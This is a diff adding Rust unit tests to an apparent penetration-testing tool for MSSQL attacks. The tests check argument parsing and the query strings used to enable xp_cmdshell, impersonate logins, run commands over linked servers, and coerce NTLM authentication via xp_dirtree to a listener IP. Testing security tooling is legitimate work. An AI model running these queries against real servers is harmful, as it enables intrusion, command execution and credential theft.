@@ -150,3 +150,212 @@ pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
 
     mssql_query(mssql_from_args(args)?, &full_query).await
 }
+
+#[cfg(test)]
+mod tests {
+    use crate::args::{optional_bool, optional_str, required_str};
+    use crate::credentials;
+    use serde_json::json;
+
+    // --- mssql_from_args required fields ---
+
+    #[test]
+    fn mssql_requires_target() {
+        let args = json!({"username": "sa"});
+        assert!(required_str(&args, "target").is_err());
+    }
+
+    #[test]
+    fn mssql_requires_username() {
+        let args = json!({"target": "10.0.0.1"});
+        assert!(required_str(&args, "username").is_err());
+    }
+
+    #[test]
+    fn mssql_windows_auth_default_false() {
+        let args = json!({"target": "10.0.0.1", "username": "sa"});
+        let windows_auth = optional_bool(&args, "windows_auth").unwrap_or(false);
+        assert!(!windows_auth);
+    }
+
+    #[test]
+    fn mssql_windows_auth_explicit_true() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "admin",
+            "windows_auth": true
+        });
+        let windows_auth = optional_bool(&args, "windows_auth").unwrap_or(false);
+        assert!(windows_auth);
+    }
+
+    // --- mssql_base auth string via impacket_target ---
+
+    #[test]
+    fn mssql_auth_string_with_domain_and_password() {
+        let auth_str =
+            credentials::impacket_target(Some("CONTOSO"), "sa", Some("P@ss"), "10.0.0.1");
+        assert_eq!(auth_str, "CONTOSO/sa:P@ss@10.0.0.1");
+    }
+
+    #[test]
+    fn mssql_auth_string_no_domain() {
+        let auth_str = credentials::impacket_target(None, "sa", Some("P@ss"), "10.0.0.1");
+        assert_eq!(auth_str, "sa:P@ss@10.0.0.1");
+    }
+
+    #[test]
+    fn mssql_auth_string_no_password() {
+        let auth_str = credentials::impacket_target(Some("CONTOSO"), "sa", None, "10.0.0.1");
+        assert_eq!(auth_str, "CONTOSO/sa@10.0.0.1");
+    }
+
+    // --- mssql_command ---
+
+    #[test]
+    fn mssql_command_requires_command() {
+        let args = json!({"target": "10.0.0.1", "username": "sa"});
+        assert!(required_str(&args, "command").is_err());
+    }
+
+    // --- mssql_enable_xp_cmdshell ---
+
+    #[test]
+    fn enable_xp_cmdshell_impersonate_query_format() {
+        let user = "sa";
+        let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
+                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+        let query = format!("EXECUTE AS LOGIN = '{user}'; {base_query}");
+        assert!(query.starts_with("EXECUTE AS LOGIN = 'sa';"));
+        assert!(query.contains("xp_cmdshell"));
+    }
+
+    #[test]
+    fn enable_xp_cmdshell_no_impersonate() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa",
+            "password": "P@ss"
+        });
+        let impersonate_user = optional_str(&args, "impersonate_user");
+        assert!(impersonate_user.is_none());
+        let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
+                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+        let query = match impersonate_user {
+            Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
+            None => base_query.to_string(),
+        };
+        assert!(!query.starts_with("EXECUTE AS LOGIN"));
+    }
+
+    // --- mssql_impersonate ---
+
+    #[test]
+    fn impersonate_query_format() {
+        let impersonate_user = "sa";
+        let query = "SELECT SYSTEM_USER;";
+        let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");
+        assert_eq!(full_query, "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;");
+    }
+
+    #[test]
+    fn impersonate_requires_impersonate_user() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa",
+            "query": "SELECT 1"
+        });
+        assert!(required_str(&args, "impersonate_user").is_err());
+    }
+
+    #[test]
+    fn impersonate_requires_query() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa",
+            "impersonate_user": "dbo"
+        });
+        assert!(required_str(&args, "query").is_err());
+    }
+
+    // --- mssql_exec_linked ---
+
+    #[test]
+    fn linked_server_query_format() {
+        let linked_server = "SQL02";
+        let query = "SELECT SYSTEM_USER;";
+        let full_query = format!("EXEC ('{query}') AT [{linked_server}];");
+        assert_eq!(full_query, "EXEC ('SELECT SYSTEM_USER;') AT [SQL02];");
+    }
+
+    #[test]
+    fn linked_server_requires_linked_server() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa",
+            "query": "SELECT 1"
+        });
+        assert!(required_str(&args, "linked_server").is_err());
+    }
+
+    #[test]
+    fn linked_server_requires_query() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa",
+            "linked_server": "SQL02"
+        });
+        assert!(required_str(&args, "query").is_err());
+    }
+
+    // --- mssql_linked_enable_xpcmdshell ---
+
+    #[test]
+    fn linked_enable_xpcmdshell_format() {
+        let linked_server = "SQL02";
+        let full_query = format!(
+            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
+             EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
+        );
+        assert!(full_query.contains("AT [SQL02]"));
+        assert!(full_query.contains("xp_cmdshell"));
+    }
+
+    // --- mssql_linked_xpcmdshell ---
+
+    #[test]
+    fn linked_xpcmdshell_format() {
+        let linked_server = "SQL02";
+        let command = "whoami";
+        let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
+        assert_eq!(full_query, "EXEC ('xp_cmdshell ''whoami''') AT [SQL02];");
+    }
+
+    #[test]
+    fn linked_xpcmdshell_requires_command() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa",
+            "linked_server": "SQL02"
+        });
+        assert!(required_str(&args, "command").is_err());
+    }
+
+    // --- mssql_ntlm_coerce ---
+
+    #[test]
+    fn ntlm_coerce_xp_dirtree_format() {
+        let listener_ip = "10.0.0.5";
+        let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");
+        assert_eq!(full_query, "EXEC master..xp_dirtree '\\\\10.0.0.5\\share'");
+    }
+
+    #[test]
+    fn ntlm_coerce_requires_listener_ip() {
+        let args = json!({
+            "target": "10.0.0.1",
+            "username": "sa"
+        });
+        assert!(required_str(&args, "listener_ip").is_err());
+    }
+}
